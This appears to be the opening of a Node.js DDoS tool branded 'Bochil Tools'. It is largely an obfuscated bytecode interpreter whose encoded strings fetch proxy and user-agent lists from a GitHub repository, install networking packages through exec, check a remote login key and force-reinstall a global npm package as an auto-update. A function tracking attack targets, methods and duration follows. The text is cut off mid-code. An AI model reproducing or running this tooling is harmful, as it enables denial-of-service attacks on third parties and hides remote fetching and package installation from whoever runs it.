#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '1.0.0'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
let vmb=typeof globalThis!=='undefined'?globalThis:typeof window!=='undefined'?window:global,vmA_fc538d=vmb['vmA_fc538d']||(vmb['vmA_fc538d']={});const vmg_dd249d=(function(){var R=Object['defineProperty'],y=Object['create'],B=Object['getOwnPropertyDescriptor'],w=Object['getOwnPropertyNames'],g=Object['getOwnPropertySymbols'],A=Object['setPrototypeOf'],D=Object['getPrototypeOf'],f=Function['prototype']['call'],b=Function['prototype']['apply'],q=Reflect['apply'],Z=WeakMap['prototype']['set'],t=WeakMap['prototype']['get'],h=WeakMap['prototype']['has'],z=WeakSet['prototype']['add'],r=WeakSet['prototype']['has'];let a=['AQIAAQAAABAIDmNvbnNvbGUICmNsZWFyBAAIBmxvZwiqAwrioIDioIDioIDioIDioIDioIDiooDio6Tio7bio7bio5bio6bio4TioYDioIDioIDioIDioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qKA4qO+4qGf4qOJ4qO94qO/4qK/4qG/4qO/4qO/4qOG4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKggOKioOKjv+Kjv+Kjv+Khl+Kgi+KgmeKhv+Kjt+KijOKjv+Kjv+KggOKggOKggOKggOKggOKggOKggEJvY2hpbFRvb2xzIAgOdmVyc2lvbgjECwrio7fio4Tio4Dio7/io7/io7/io7/io7fio6bio6Tio77io7/io7/io7/iob/ioIDioIDioIDioIDioIDioIDioIBPd25lcjogQm9jaGlsVGVhbQrioIjioJnioJvio7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io6fioYDioIDiooDioIDioIDioIDioIBWaXA6IFllcwrioIDioIDioIDioLjio7/io7/io7/io7/io7/io7/io7/io7/io7/ioZ/ioLvioL/ioL/ioIvioIDioIDioIDioIBUZWxlZ3JhbTogQEJvY2hpbFRlYW0K4qCA4qCA4qCA4qCA4qC54qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qGH4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCARXhwaXJlZDog4oieCuKggOKggOKggOKggOKggOKgiOKiv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjh+KggOKggOKggOKggOKggOKggOKggOKhhArioIDioIDioIDioIDioIDioIDioIDioJnior/io7/io7/io7/io7/io7/io4bioIDioIDioIDioIDiooDiob7ioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCI4qC74qO/4qO/4qO/4qO/4qO34qO24qO04qO+4qCP4qCA4qCACuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKgiOKgieKgm+Kgm+Kgm+Kgi+KggeKggOKggOKggOKggApXZWxjb21lIHRvIG15IEREb1MgdG9vbHMhISEgeW91IGNhbiBjb250YWN0IG1lIGlmIHlvdSBmaW5kIGEgYnVn4qCACj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQQBLIoCCIACAMoBBooCCIACAIoCekAAQBQUAMoBBgLMAQQAAAQBBAIEAAAEAAAEAwQEBAUAAAQGAAAABAcEAQAAAA==','AQIYAQAABB4IjgFodHRwczovL2dpdGh1Yi5jb20vd2FuejhjcmVhdG9yL2dhcGVudGluZy9yYXcvcmVmcy9oZWFkcy9tYWluL3Byb3h5LnR4dAgKZmV0Y2gEAQgIdGV4dAQACARmcwgad3JpdGVGaWxlU3luYwgScHJveHkudHh0CAp1dGYtOAQDCBhfMHgzMzIwYTUkJDEIDmNvbnNvbGUICmVycm9yCCpFcnJvciBmZXRjaGluZyBkYXRhOiAIDm1lc3NhZ2VsBADGBQQAwAUA0AEEAAAEAYoCBAIABAHIAQCEBAQADgQADAAIBAOAAgQEAAQAygEAhAQEAQ4EBYoCAAgEBoACBAcAABQAFAQBDAAUABQECAAAFAAUBAkABAPKAQAGANIBAMABBADGBQQAwAUECtQBBAuKAgAIBAyAAgQNAAQKwgUEDoACAHoAQAAUABQEAgAEAcoBAAYEAMgFAMABBADIBQACAMwBBEBmZGYCBEQAaA==','AQIYAQAABB4IiAFodHRwczovL2dpdGh1Yi5jb20vd2FuejhjcmVhdG9yL2dhcGVudGluZy9yYXcvcmVmcy9oZWFkcy9tYWluL3VhLnR4dAgKZmV0Y2gEAQgIdGV4dAQACARmcwgad3JpdGVGaWxlU3luYwgMdWEudHh0CAp1dGYtOAQDCBhfMHgyZjQ3NDckJDEIDmNvbnNvbGUICmVycm9yCCpFcnJvciBmZXRjaGluZyBkYXRhOiAIDm1lc3NhZ2VsBADGBQQAwAUA0AEEAAAEAYoCBAIABAHIAQCEBAQADgQADAAIBAOAAgQEAAQAygEAhAQEAQ4EBYoCAAgEBoACBAcAABQAFAQBDAAUABQECAAAFAAUBAkABAPKAQAGANIBAMABBADGBQQAwAUECtQBBAuKAgAIBAyAAgQNAAQKwgUEDoACAHoAQAAUABQEAgAEAcoBAAYEAMgFAMABBADIBQACAMwBBEBmZGYCBEQAaA==','AQAIAQAAAAoIBGZzCBRleGlzdHNTeW5jCBJwcm94eS50eHQEAQgUdW5saW5rU3luYygEAAAEAQQCAAAEAwQBAAQAAAQEBAIAAAQDBAEAAACKAgiAAgAUFADKAcQBigIIgAIAFBQAygEGAswBAhAk','AQAIAQAAAAoIBGZzCBRleGlzdHNTeW5jCAx1YS50eHQEAQgUdW5saW5rU3luYygEAAAEAQQCAAAEAwQBAAQAAAQEBAIAAAQDBAEAAACKAgiAAgAUFADKAcQBigIIgAIAFBQAygEGAswBAhAk','AQMIAQACAC4IGF8weDE3ZTMyYyQkMggIdHJpbQQACA5jb25zb2xlCAZsb2cIJFN1Y2Nlc3NmdWx5IExvZ2dlZAQBCBZzY3JhcGVQcm94eQhQfHwg4paT4paT4paT4paT4paT4paT4paT4paR4paR4paRIHx8IDcwJQgec2NyYXBlVXNlckFnZW50CFJ8fCDilpPilpPilpPilpPilpPilpPilpPilpPilpPilpMgfHwgMTAwJQW8AggKc2xlZXAICmNsZWFyCDBXZWxjb21lIFRvIEJvY2hpbCBUb29scyAIDnZlcnNpb24F6AMIDGJhbm5lcghaVHlwZSAibWVudSIgRm9yIFNob3dpbmcgQWxsIEF2YWlsYWJsZSBDb21tYW5kCApzaWdtYQgSV3JvbmcgS2V5CA5wcm9jZXNzCAhleGl05gEEAMYFBADABQQAEAQAwgUACAQBgAIEAgAEAMoBAIQBAMQBBAOKAgAIBASAAgQFAAAUABQEBgAEAcoBAAYEB8IFBAIABADIAQCEBAAGBAOKAgAIBASAAgQIAAAUABQEBgAEAcoBAAYECcIFBAIABADIAQCEBAAGBAOKAgAIBASAAgQKAAAUABQEBgAEAcoBAAYECwAEDIoCBAYABAHIAQCEBAAGBAOKAgAIBA2AAgQCAAQAygEABgQDigIACAQEgAIEDgAED4oCAHoAQAAUABQEBgAEAcoBAAYEEAAEDIoCBAYABAHIAQCEBAAGBBHCBQQCAAQAyAEAhAQABgQDigIACAQEgAIEEgAAFAAUBAYABAHKAQAGBBOKAgQCAAQAyAEABgDAAQQDigIACAQEgAIEFAAAFAAUBAYABAHKAQAGBBWKAgAIBBaAAgQGAABKABQAFAQGAAQBygEABgQSwAG+AeYB','AQIYAQAACEQIGF8weDE3ZTMyYyQkMggOY29uc29sZQgGbG9nCFB8fCDilpPilpHilpHilpHilpHilpHilpHilpHilpHilpEgfHwgMTAlBAEIqgJucG0gaSBheGlvcyB0bHMgaHR0cDIgaHBhY2sgbmV0IGNsdXN0ZXIgY3J5cHRvIHNzaDIgZGdyYW0gQHdoaXNrZXlzb2NrZXRzL2JhaWxleXMgbGlicGhvbmVudW1iZXItanMgY2hhbGsgZ3JhZGllbnQtc3RyaW5nIHBpbm8gbWluZWZsYXllciBwcm94eS1hZ2VudAgIZXhlYwhQfHwg4paT4paT4paR4paR4paR4paR4paR4paR4paR4paRIHx8IDIwJQi4AWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS93YW56OGNyZWF0b3IvZ2FwZW50aW5nL3JlZnMvaGVhZHMvbWFpbi9Cb2NoaWxUZWFtVmVyc2kudHh0CApmZXRjaAgIdGV4dAQACFB8fCDilpPilpPilpPilpHilpHilpHilpHilpHilpHilpEgfHwgMzAlCA52ZXJzaW9uCAh0cmltCFB8fCDilpPilpPilpPilpPilpPilpPilpHilpHilpHilpEgfHwgNjAlCLQBaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3dhbno4Y3JlYXRvci9nYXBlbnRpbmcvcmVmcy9oZWFkcy9tYWluL2JvY2hpbHRlYW1rZXkudHh0CCRMb2dpbiBLZXkgUmVxdWlyZWQIDHBlcm1lbggQcXVlc3Rpb24ISlsbWzFtG1szMW1Cb2NoaWxUZWFtIFNlY3VyaXR5G1swbV06IAoEBQQCCDRUaGlzIFZlcnNpb24gSXMgT3V0ZGF0ZWQuIAgIID0+IAgsV2FpdGluZyBBdXRvIFVwZGF0ZS4uLgg4bnBtIHVuaW5zdGFsbCAtZyBwcm1ubWQtdHVscwgiSW5zdGFsbGluZyB1cGRhdGUIKG5wbSBpIC1nIHBybW5tZC10dWxzCChSZXN0YXJ0IFRvb2xzIFBsZWFzZQgOcHJvY2VzcwgIZXhpdAgYXzB4MTNjZjVlJCQxCB5BcmUgWW91IE9ubGluZT+CAwAEAAQABAAEAQAEAgQDAAAEBAQBAAQFBAYEBAQBAAAEAQAEAgQHAAAEBAQBAAQIBAkEBAQBAAQABAAABAoECwQAAAQBBAEABAIEDAAABAQEAQAEDQQBAAQOBAsEAAAABAAEAAQABAEABAIEDwAABAQEAQAEEAQJBAQEAQAEAgQCAAQKBAsEAAAEAAQBAAQCBBEAAAQEBAEAAAQSAAQTBBQAAAQVAAAABBYEAgAEAAAEAQAEAgQXBA0AAAQYAAQBAAQOBAsEAAAAAAAEBAQBAAQBAAQCBBkAAAQEBAEABBoEBgQEBAEAAAQBAAQCBBsAAAQEBAEABBwEBgQEBAEAAAQBAAQCBB0AAAQEBAEABB4ABB8ECwQAAAQAAAAEAAQABCAEAQAEAgQhAAAEBAQBAAQAAAAA0AHGBcAF0AWKAgiAAgAUFADKAQYAigIAyAGEBAaKAgiAAgAUFADKAQYAigIAyAGEBA4MCIACAMoBhAQOigIIgAIAFBQAygEGigIMCIACAMoBhAHEAcYFwAXQBYoCCIACABQUAMoBBgCKAgDIAYQEDgwIgAIAygGEBM4FigIIgAIAFBQAygGEBAaKAgiAAgAUFACAAxQUAMoBBsgFwAGKAgiAAgCKAnpAAEAMCIACAMoBekAUFADKAQaKAgiAAgAUFADKAQYAigIAyAGEBAaKAgiAAgAUFADKAQYAigIAyAGEBAaKAgiAAgAUFADKAQaKAgiAAgDKAQbIBdIBwAHGBcAF1AGKAgiAAgAUFADKAQbIBcABAswBCHLYAdYB3ALgAv4C/AL+AgIA5AIAgAM='],U={'0':0x166,'1':0x19f,'2':0x139,'3':0x1f0,'4':0x1c2,'5':0xc6,'6':0x1f7,'7':0xb,'8':0x1f9,'9':0x143,'10':0x1a1,'32':0x183,'33':0x38,'34':0x70,'35':0x7f,'36':0x16d,'37':0x11c,'38':0x34,'39':0x1c1,'40':0x1a,'41':0x181,'48':0xe,'49':0x11b,'50':0x1c3,'51':0x1bf,'52':0x114,'53':0x173,'54':0x4f,'56':0x126,'60':0x1ad,'61':0x110,'64':0x190,'65':0x31,'66':0x19d,'67':0xee,'68':0x1c0,'69':0xa1,'70':0x15d,'71':0x1b9,'96':0xd6,'97':0x1a4,'98':0x19c,'99':0x6c,'100':0x1ec,'101':0x6,'102':0x116,'103':0x23,'104':0x13d,'105':0xe8,'106':0x40,'107':0x45,'108':0xe4,'109':0x191,'110':0x9f,'111':0x18f,'128':0x2,'129':0x52,'130':0x68,'131':0x13b,'132':0x134,'133':0x14f,'134':0x102,'135':0x4b,'136':0x19a,'137':0x9,'138':0x1b0,'139':0xdd,'140':0x50,'141':0x159,'142':0x81,'152':0xcd,'153':0x36,'154':0x185,'160':0x1aa,'161':0x1cc,'162':0xd8,'163':0x1ee,'164':0x165,'165':0x51,'192':0x145,'193':0x5f,'194':0x1fe,'195':0x21,'196':0xc8,'197':0x117,'198':0x128,'199':0x64,'208':0xe9,'224':0x10,'225':0xdc,'226':0x177,'256':0x1ae,'257':0x123,'258':0x125,'259':0xd9,'260':0x113,'261':0x172,'262':0xb8,'263':0x8,'264':0xa9,'265':0x17,'266':0xaa,'267':0x1a3,'268':0x12c,'280':0x137,'288':0x19,'289':0xca,'290':0x6a,'291':0x87,'292':0x1b,'293':0x19b,'294':0x138,'295':0x6d,'296':0x7,'297':0x1f8,'304':0x1a2,'305':0x12b,'306':0xa3,'307':0x1b1,'308':0x5e,'309':0x1e3,'316':0x1e4,'320':0x74,'321':0x1f3,'322':0x1d2,'323':0x49,'324':0x174,'325':0x1a6,'326':0x1f6,'327':0x37,'328':0x121,'329':0xe1,'352':0xef,'353':0xa0,'354':0xb3,'355':0x4d,'356':0x195,'357':0x1eb,'358':0x17c,'359':0x1e2,'360':0x118,'361':0x16,'362':0xa7,'363':0x160,'384':0x1df,'385':0x1da,'386':0xcc,'387':0x75,'388':0x146,'389':0x13a,'390':0xfe,'391':0x8b,'392':0x76,'393':0x1a0,'394':0x2f,'395':0x15f,'416':0x1e,'417':0xba,'448':0x1d8,'449':0xc0,'450':0x4e};const P=0x1,k=0x2,J=0x3,o=0x4,N=0x100,p=0x101,S=0x102,H=typeof 0x0n,F=[],M=function(){throw new TypeError('\x27caller\x27,\x20\x27callee\x27,\x20and\x20\x27arguments\x27\x20properties\x20may\x20not\x20be\x20accessed\x20on\x20strict\x20mode\x20functions\x20or\x20the\x20arguments\x20objects\x20for\x20calls\x20to\x20them');};Object['preventExtensions'](M);let j=new WeakSet(),Y=new WeakSet(),K=new WeakMap(),s=new WeakMap(),L=[],l=null,c=null,n=null,x=null,W=null;try{let RV=function*(){};l=D(RV),c=l&&l['prototype'];}catch(Rv){}try{let RO=async function*(){};n=D(RO),x=n&&n['prototype'];}catch(y0){}try{let y1=async function(){};W=D(y1);}catch(y2){}function u(y3,y4,y5){try{R(y3,y4,y5);}catch(y6){}}function G(y3,y4){let y5=new Array(y4),y6=![];for(let y8=y4-0x1;y8>=0x0;y8--){let y9=y3();y9&&typeof y9==='object'&&r['call'](j,y9)?(y6=!![],y5[y8]=y9):y5[y8]=y9;}if(!y6)return y5;let y7=[];for(let yR=0x0;yR<y4;yR++){let yy=y5[yR];if(yy&&typeof yy==='object'&&r['call'](j,yy)){let yB=yy['value'];if(Array['isArray'](yB)){for(let yw=0x0;yw<yB['length'];yw++)y7['push'](yB[yw]);}}else y7['push'](yy);}return y7;}function E(y3){return typeof y3==='object'||typeof y3==='function';}function Q(y3){return{'value':y3,'writable':!![],'configurable':!![]};}function X(y3,y4){return y3&&E(y3)?y3:y4;}function T(y3,y4){try{A(y3,y4);}catch(y5){}}function I(y3,y4){let y5=y3===null||y3===undefined?undefined:y3[y4];if(y5===null||y5===undefined)return undefined;if(typeof y5!=='function')throw new TypeError('Method\x20is\x20not\x20callable');return y5;}function C(y3){if(y3===null||typeof y3!=='object'&&typeof y3!=='function')throw new TypeError('Iterator\x20result\x20'+y3+'\x20is\x20not\x20an\x20object');}function i(y3){let y4=y3['done'];return{'done':y4,'value':y4?y3['value']:undefined};}function d(y3){let y4=I(y3,Symbol['asyncIterator']),y5,y6;if(y4!==undefined)y5=q(y4,y3,[]),y6=![];else{let y8=I(y3,Symbol['iterator']);if(y8===undefined)throw new TypeError(typeof y3+'\x20is\x20not\x20iterable');y5=q(y8,y3,[]),y6=!![];}if(y5===null||typeof y5!=='object')throw new TypeError('Iterator\x20method\x20returned\x20a\x20non-object\x20value');let y7=y5['next'];if(typeof y7!=='function')throw new TypeError('Iterator\x20next\x20is\x20not\x20a\x20function');return{'iter':y5,'nextMethod':y7,'isSync':y6};}function m(y3){let y4=[];for(let y5 in y3){y4['push'](y5);}return y4;}function V(y3){return Array['prototype']['slice']['call'](y3);}function v(y3){return typeof y3==='function'&&y3['prototype']?y3['prototype']:y3;}function O(y3){if(typeof y3==='function')return D(y3);let y4=D(y3),y5=y4&&B(y4,'constructor'),y6=y5&&y5['value'],y7=y6&&typeof y6==='function'&&(y6['prototype']===y4||D(y6['prototype'])===D(y4));if(y7)return D(y4);return y4;}function R0(y3,y4){let y5=y3;while(y5!==null){let y6=B(y5,y4);if(y6)return{'desc':y6,'proto':y5};y5=D(y5);}return{'desc':null,'proto':y3};}function R1(y3,y4){if(!y3['_$caRujf'])return;y4 in y3['_$caRujf']&&delete y3['_$caRujf'][y4];let y5=y4['indexOf']('$$');if(y5!==-0x1){let y6=y4['substring'](y5+0x2),y7=y6['length']>0x0;for(let y8=0x0;y8<y6['length'];y8++){let y9=y6['charCodeAt'](y8);if(y9<0x30||y9>0x39){y7=![];break;}}if(y7){let yR=y4['substring'](0x0,y5);yR in y3['_$caRujf']&&delete y3['_$caRujf'][yR];}}}function R2(y3,y4){let y5=y3;while(y5){R1(y5,y4),y5=y5['_$FJxotm'];}}function R3(y3,y4){let y5=y3;while(y5){let y6=y5['_$caRujf'];y6&&'__this__'in y6&&(delete y6['__this__'],!y5['_$Ku4GWQ']&&(y5['_$Ku4GWQ']=y(null)),y5['_$Ku4GWQ']['__this__']=y4),y5=y5['_$FJxotm'];}}function R4(y3){let y4=y3;while(y4){let y5=y4['_$Ku4GWQ'];if(y5&&'__this__'in y5)return y5['__this__'];y4=y4['_$FJxotm'];}}function R5(y3,y4){var y5=y3[y4],y6=function(){vmA_fc538d['_$cmiO0g']=!![];var y7=vmA_fc538d['_$tjy115'];vmA_fc538d['_$tjy115']=y3;try{return Reflect['apply'](y5,this,arguments);}finally{vmA_fc538d['_$tjy115']=y7;}};Object['defineProperties'](y6,{'length':{'value':y5['length'],'configurable':!![]},'name':{'value':y5['name'],'configurable':!![]}}),y3[y4]=y6,(vmA_fc538d['_$Gf18ML']||(vmA_fc538d['_$Gf18ML']=new WeakMap()))['set'](y6,y3);}vmA_fc538d['_$pgUGzf']=R5;function R6(y3,y4,y5){if(y3[0xf]===undefined||!y5)return;let y6=y3[0x10][y3[0xf]];!y4['_$Ku4GWQ']&&(y4['_$Ku4GWQ']=y(null)),y4['_$Ku4GWQ'][y6]=y5,y3[0x8]&&(!y4['_$oTA9Eu']&&(y4['_$oTA9Eu']=y(null)),y4['_$oTA9Eu'][y6]=!![]),u(y5,'name',{'value':y6,'writable':![],'enumerable':![],'configurable':!![]});}function R7(y3,y4,y5){if(!y3||y4[0x0]||y4[0x5]||y4[0xd])return;!h['call'](K,y3)&&Z['call'](K,y3,{'b':y4,'e':y5,'c':y4});}function R8(y3,y4,y5,y6,y7,y8){let y9;if(y8){y6?y9={'ZFHiIx'(){'use strict';let yR=new.target!==undefined?new.target:vmA_fc538d['_$WAnJQa'];return y3(y4,arguments,y5,y9,yR,this);}}['ZFHiIx']:y9={'ZFHiIx'(){let yR=new.target!==undefined?new.target:vmA_fc538d['_$WAnJQa'];return y3(y4,arguments,y5,y9,yR,this);}}['ZFHiIx'];try{delete y9['prototype'];}catch(yR){}}else y6?y9=function yy(){'use strict';let yB=new.target!==undefined?new.target:vmA_fc538d['_$WAnJQa'];return y3(y4,arguments,y5,y9,yB,this);}:y9=function yB(){let yw=new.target!==undefined?new.target:vmA_fc538d['_$WAnJQa'];return y3(y4,arguments,y5,y9,yw,this);};return Z['call'](K,y9,{'b':y4,'e':y5}),y9;}function R9(y3,y4,y5,y6,y7){let y8;y6?y8={'ZFHiIx'(){'use strict';let y9=new.target!==undefined?new.target:vmA_fc538d['_$WAnJQa'];return y3(y4,arguments,y5,y8,y9,undefined,this);}}['ZFHiIx']:y8={'ZFHiIx'(){let y9=new.target!==undefined?new.target:vmA_fc538d['_$WAnJQa'];return y3(y4,arguments,y5,y8,y9,undefined,this);}}['ZFHiIx'];if(W)T(y8,W);return y8;}function RR(y3,y4,y5,y6,y7,y8,y9){let yR;y7?yR={'ZFHiIx'(){'use strict';return y3(y4,arguments,y5,yR,vmA_fc538d['_$tjy115'],this);}}['ZFHiIx']:yR={'ZFHiIx'(){return y3(y4,arguments,y5,yR,vmA_fc538d['_$tjy115'],this);}}['ZFHiIx'];z['call'](y6,yR);let yy=y9?n:l,yB=y9?x:c;if(yy)T(yR,yy);try{R(yR,'prototype',{'value':yB?y(yB):y({}),'writable':!![],'enumerable':![],'configurable':![]});}catch(yw){}return yR;}function Ry(y3,y4,y5,y6){let y7=vmA_fc538d['_$tjy115'],y8;return y8={'ZFHiIx':(...y9)=>{return y7!==undefined&&(vmA_fc538d['_$cmiO0g']=!![],vmA_fc538d['_$tjy115']=y7),y3(y4,y9,y5,y8,undefined,y6);}}['ZFHiIx'],y8;}function RB(y3,y4,y5,y6){let y7;y7={'ZFHiIx':(...y8)=>{return y3(y4,y8,y5,y7,undefined,undefined,y6);}}['ZFHiIx'];if(W)T(y7,W);return y7;}function Rw(y3,y4,y5,y6,y7,y8){let y9=[void 0x0,void 0x0,void 0x0,void 0x0,void 0x0,void 0x0,void 0x0,void 0x0],yR=0x0,yy=new Array((y3[0x12]||0x0)+(y3[0xb]||0x0)),yB=0x0,yw=y3[0x10],yg=y3[0x3],yA=y3[0x4]||F,yD=y3[0x7]||F,yf=yg['length']>>0x1,yb=(y3[0x12]*0x1f^y3[0xb]*0x11^yf*0xd^yw['length']*0x7)>>>0x0&0x3,yq,yZ,yt;switch(yb){case 0x1:yq=0x1,yZ=0x0,yt=0x1;break;case 0x2:yq=0x0,yZ=yf,yt=0x0;break;case 0x3:yq=yf,yZ=0x0,yt=0x0;break;default:yq=0x0,yZ=0x1,yt=0x1;break;}let yh=null,yz=null,yr=![],ya=undefined,yU=![],ye=0x0,yP=![],yk=0x0,yJ=!!y3[0x14],yo=!!y3[0x13],yN=!!y3[0xe],yp=!!y3[0xc],yS=y8,yH=!!y3[0xd];!yJ&&!yH&&(y8===undefined||y8===null)&&(y8=vmb);let yF=yT=>{y9[yR++]=yT;},yM=()=>y9[--yR],yj={['_$Ku4GWQ']:null,['_$Z2ispg']:null,['_$caRujf']:null,['_$FJxotm']:y5};if(y4){let yT=y3[0x12]||0x0;for(let yI=0x0,yC=y4['length']<yT?y4['length']:yT;yI<yC;yI++){yy[yI]=y4[yI];}}let yY=(yJ||!yo)&&y4?V(y4):null,yK=null,ys=![],yL=yy['length'],yl=null,yc=0x0;yp&&(yj['_$caRujf']=y(null),yj['_$caRujf']['__this__']=!![]);R6(y3,yj,y6),R7(y6,y3,y5);let yn={['_$FAYvmO']:yJ,['_$S4T0ZB']:yo,['_$Z2okcI']:yN,['_$Gjeg1O']:yp,['_$HFN2rV']:ys,['_$2T6lEH']:yS,['_$kIcUXz']:yY,['_$L5LBg6']:yj};while(yB<yf){try{while(yB<yf){let yi=yg[yq+(yB<<yt)],yd=yg[yZ+(yB<<yt)];var yx,yW,yu,yG,yE,yQ;!yG&&(yW=null,yu=function(){for(let ym=yL-0x1;ym>=0x0;ym--){yy[ym]=yl[--yc];}yj=yl[--yc],yn['_$L5LBg6']=yj,yY=yl[--yc],yn['_$kIcUXz']=yY,yK=yl[--yc],y4=yl[--yc],yR=yl[--yc],yB=yl[--yc],y9[yR++]=yx,yB++;},yG=function(ym,yV){switch(ym){case 0x20:{Bx:{let yv=y9[--yR],yO=y9[--yR];y9[yR++]=yO+yv,yB++;}break;}case 0x30:{BW:{let B0=y9[--yR],B1=y9[--yR];y9[yR++]=B1&B0,yB++;}break;}case 0x44:{Bu:{let B2=y9[--yR],B3=y9[--yR];y9[yR++]=B3<B2,yB++;}break;}case 0x41:{BG:{let B4=y9[--yR],B5=y9[--yR];y9[yR++]=B5!=B4,yB++;}break;}case 0x45:{BE:{let B6=y9[--yR],B7=y9[--yR];y9[yR++]=B7<=B6,yB++;}break;}case 0x3c:{BQ:{let B8=y9[--yR];y9[yR++]=typeof B8===H?B8:+B8,yB++;}break;}case 0x27:{BX:{let B9=y9[--yR];y9[yR++]=typeof B9===H?B9-0x1n:+B9-0x1,yB++;}break;}case 0x34:{BT:{let BR=y9[--yR],By=y9[--yR];y9[yR++]=By<<BR,yB++;}break;}case 0x43:{BI:{let BB=y9[--yR],Bw=y9[--yR];y9[yR++]=Bw!==BB,yB++;}break;}case 0x2:{BC:{y9[yR++]=null,yB++;}break;}case 0x22:{Bi:{let Bg=y9[--yR],BA=y9[--yR];y9[yR++]=BA*Bg,yB++;}break;}case 0xa:{Bd:{let BD=y9[yR-0x3],Bf=y9[yR-0x2],Bb=y9[yR-0x1];y9[yR-0x3]=Bf,y9[yR-0x2]=Bb,y9[yR-0x1]=BD,yB++;}break;}case 0x25:{Bm:{y9[yR-0x1]=-y9[yR-0x1],yB++;}break;}case 0x38:{BV:{y9[yR-0x1]=!y9[yR-0x1],yB++;}break;}case 0x28:{Bv:{let Bq=y9[--yR],BZ=y9[--yR];y9[yR++]=BZ**Bq,yB++;}break;}case 0x46:{BO:{let Bt=y9[--yR],Bh=y9[--yR];y9[yR++]=Bh>Bt,yB++;}break;}case 0x9:{w0:{y4[yV]=y9[--yR],yB++;}break;}case 0x7:{w1:{yy[yV]=y9[--yR],yB++;}break;}case 0x5:{w2:{let Bz=y9[yR-0x1];y9[yR-0x1]=y9[yR-0x2],y9[yR-0x2]=Bz,yB++;}break;}case 0x33:{w3:{y9[yR-0x1]=~y9[yR-0x1],yB++;}break;}case 0x4:{w4:{let Br=y9[yR-0x1];y9[yR++]=Br,yB++;}break;}case 0x40:{w5:{let Ba=y9[--yR],BU=y9[--yR];y9[yR++]=BU==Ba,yB++;}break;}case 0x21:{w6:{let Be=y9[--yR],BP=y9[--yR];y9[yR++]=BP-Be,yB++;}break;}case 0x26:{w7:{let Bk=y9[--yR];y9[yR++]=typeof Bk===H?Bk+0x1n:+Bk+0x1,yB++;}break;}case 0x35:{w8:{let BJ=y9[--yR],Bo=y9[--yR];y9[yR++]=Bo>>BJ,yB++;}break;}case 0x42:{w9:{let BN=y9[--yR],Bp=y9[--yR];y9[yR++]=Bp===BN,yB++;}break;}case 0x24:{wR:{let BS=y9[--yR],BH=y9[--yR];y9[yR++]=BH%BS,yB++;}break;}case 0x31:{wy:{let BF=y9[--yR],BM=y9[--yR];y9[yR++]=BM|BF,yB++;}break;}case 0x6:{wB:{y9[yR++]=yy[yV],yB++;}break;}case 0x29:{ww:{y9[yR-0x1]=+y9[yR-0x1],yB++;}break;}case 0x47:{wg:{let Bj=y9[--yR],BY=y9[--yR];y9[yR++]=BY>=Bj,yB++;}break;}case 0x32:{wA:{let BK=y9[--yR],Bs=y9[--yR];y9[yR++]=Bs^BK,yB++;}break;}case 0x23:{wD:{let BL=y9[--yR],Bl=y9[--yR];y9[yR++]=Bl/BL,yB++;}break;}case 0x1:{wf:{y9[yR++]=undefined,yB++;}break;}case 0x8:{wb:{y9[yR++]=y4[yV],yB++;}break;}case 0x3:{wq:{y9[--yR],yB++;}break;}case 0x3d:{wZ:{if(typeof y9[yR-0x1]==='symbol')throw new TypeError('Cannot\x20convert\x20a\x20Symbol\x20value\x20to\x20a\x20string');y9[yR-0x1]=String(y9[yR-0x1]),yB++;}break;}case 0x36:{wt:{let Bc=y9[--yR],Bn=y9[--yR];y9[yR++]=Bn>>>Bc,yB++;}break;}case 0x0:{wh:{y9[yR++]=yw[yV],yB++;}break;}}},yE=function(ym,yV){switch(ym){case 0xc4:{g2:{let yv=y9[--yR],yO=G(yM,yv),B0=y9[--yR];if(typeof B0!=='function')throw new TypeError(B0+'\x20is\x20not\x20a\x20constructor');if(r['call'](Y,B0))throw new TypeError(B0['name']+'\x20is\x20not\x20a\x20constructor');let B1=vmA_fc538d['_$tjy115'];vmA_fc538d['_$tjy115']=undefined;let B2;try{B2=Reflect['construct'](B0,yO);}finally{vmA_fc538d['_$tjy115']=B1;}y9[yR++]=B2,yB++;}break;}case 0x82:{g3:{let B3=y9[--yR],B4=y9[--yR];if(B4===null||B4===undefined){if(B3===Symbol['iterator'])throw new TypeError((B4===null?'object\x20null':'undefined')+'\x20is\x20not\x20iterable\x20(cannot\x20read\x20property\x20Symbol(Symbol.iterator))');throw new TypeError('Cannot\x20read\x20properties\x20of\x20'+B4+'\x20(reading\x20'+(typeof B3==='symbol'?'\x27'+B3['toString']()+'\x27':typeof B3==='string'?'\x27'+B3+'\x27':typeof B3==='object'||typeof B3==='function'?'\x27<computed\x20key>\x27':'\x27'+String(B3)+'\x27')+')');}y9[yR++]=B4[B3],yB++;}break;}case 0x89:{g4:{let B5=y9[--yR],B6=y9[--yR];y9[yR++]=B6 in B5,yB++;}break;}case 0x85:{g5:{let B7=yw[yV],B8;if(vmA_fc538d['_$wF8bZr']&&B7 in vmA_fc538d['_$wF8bZr'])throw new ReferenceError('Cannot\x20access\x20\x27'+B7+'\x27\x20before\x20initialization');if(B7 in vmA_fc538d)B8=vmA_fc538d[B7];else{if(B7 in vmb)B8=vmb[B7];else throw new ReferenceError(B7+'\x20is\x20not\x20defined');}y9[yR++]=B8,yB++;}break;}case 0x88:{g6:{let B9=y9[--yR],BR=yw[yV];B9===null||B9===undefined?y9[yR++]=undefined:y9[yR++]=B9[BR],yB++;}break;}
// [========================================] //
async function pushMonitor(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
